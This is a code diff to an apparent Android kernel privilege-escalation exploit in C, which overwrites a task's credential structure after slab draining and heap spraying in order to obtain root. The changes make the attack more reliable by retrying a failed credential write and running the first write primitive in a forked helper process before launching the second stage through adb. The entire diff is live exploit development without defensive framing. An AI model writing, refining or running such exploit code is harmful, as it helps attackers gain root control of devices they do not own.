@@ -577,7 +577,10 @@ int run_exploit(int argc, char **argv) {
   for (int round = 1; round <= 10 && !got_root; round++) {
     pr_info("round %d/10: cred write\n", round);
     slab_drain();
-    do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2);
+    if (!do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2)) {
+      pr_warning("W2: cred preparation failed on round %d\n", round);
+      continue;
+    }
     usleep(50000);
     write(pipes.cmd_w, "C", 1);
     uint32_t child_uid = 9999;
@@ -628,8 +631,33 @@ extern int mini_adb_shell(const char *cmd);
 static int run_bootstrap(void) {
   log_startup_context();
 
-  int ret = run_write1_only();
-  if (ret != 0) return ret;
+  /* Keep W1's spray, reclaim sockets, and PI helper threads out of the
+   * process that later launches W2 through adb.  W1 deliberately leaves its
+   * reclaimed page held until the owning process exits; running W1 inline
+   * would therefore let that state interfere with W2 in the shell process. */
+  pid_t w1_child = fork();
+  if (w1_child < 0) {
+    pr_error("cannot fork W1 helper errno=%d\n", errno);
+    return 1;
+  }
+  if (w1_child == 0) {
+    _exit(run_write1_only());
+  }
+
+  int w1_status;
+  pid_t waited;
+  do {
+    waited = waitpid(w1_child, &w1_status, 0);
+  } while (waited < 0 && errno == EINTR);
+  if (waited < 0) {
+    pr_error("waiting for W1 helper failed errno=%d\n", errno);
+    return 1;
+  }
+  if (!WIFEXITED(w1_status) || WEXITSTATUS(w1_status) != 0) {
+    pr_error("W1 helper failed status=%d\n", w1_status);
+    return 1;
+  }
+  pr_info("W1 helper exited; reclaimed state released before W2\n");
 
   /* Wait for adb TCP — read the actual port from system property */
   int adb_port = 5555;
